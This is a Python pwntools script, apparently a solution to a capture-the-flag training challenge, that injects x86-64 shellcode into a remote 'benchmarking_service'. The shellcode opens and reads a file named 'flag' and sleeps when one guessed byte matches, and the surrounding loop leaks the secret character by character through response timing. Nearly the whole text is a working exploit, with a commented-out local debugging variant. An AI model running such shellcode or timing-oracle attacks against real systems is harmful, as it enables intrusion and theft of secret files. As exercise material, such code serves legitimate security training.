from pwn import *
import time
import subprocess
import sys

shellcode = """
xor    rsi,rsi
xor    rdx,rdx
mov    rdi,0x67616c66
push   rdi
mov    rdi,rsp
add    rax,0x100 
push   rax
mov    rax,0x2
syscall
mov    rdi,rax
xor    rax,rax
pop    rsi
mov    rdx,0x100
syscall 
mov al, [rsi + {}]
cmp al, {}
jne .check
xor rsi, rsi
xor rdi, rdi
mov rax, 0x23
push 0x0
push 0x2
lea rdi, [rsp]
syscall
.check:
push 0x1
"""

"""
context.terminal = ['tmux', 'splitw', '-h']                                                  
command = f'echo -n "{shellcode.format(0, ord("c"))}" | genbin'
try:
    bin_shellcode = bytes.fromhex(subprocess.check_output(command, shell=True, universal_newlines=True))
except (subprocess.CalledProcessError, ValueError) as e:
    print(f"An exception occurred: {e}")
    exit(-1)
r = process("./benchmarking_service")
gdb.attach(r, """
#b *0x004013a0
#unset env
#c
""")
time.sleep(0.2)
start = time.time()
r.send(bin_shellcode+b"b"*1024)
print(r.recvall().decode())
r.close()
end = time.time()
delta = end - start
if delta > 1:
    print(red_text + char + reset_color)
"""

context.log_level = "error"

red_text = "\033[91m"
reset_color = "\033[0m"

characters = string.ascii_letters + string.digits + "!@#$%^&*()_+-=[]{}|;':,.<>?/\\"
for counter in range(50):
    for char in characters:
        command = f'echo -n "{shellcode.format(counter, ord(char))}" | genbin'
        try:
            bin_shellcode = bytes.fromhex(subprocess.check_output(command, shell=True, universal_newlines=True))
        except (subprocess.CalledProcessError, ValueError) as e:
            print(f"An exception occurred: {e}")
            exit(-1)
        r = remote("bin.training.offdef.it", 5001)
        time.sleep(0.2)
        start = time.time()
        r.send(bin_shellcode+b"b"*1024)
        r.recvall()
        r.close()
        end = time.time()
        delta = end - start
        if delta > 1:
            print(red_text + char + reset_color, end="")
            break
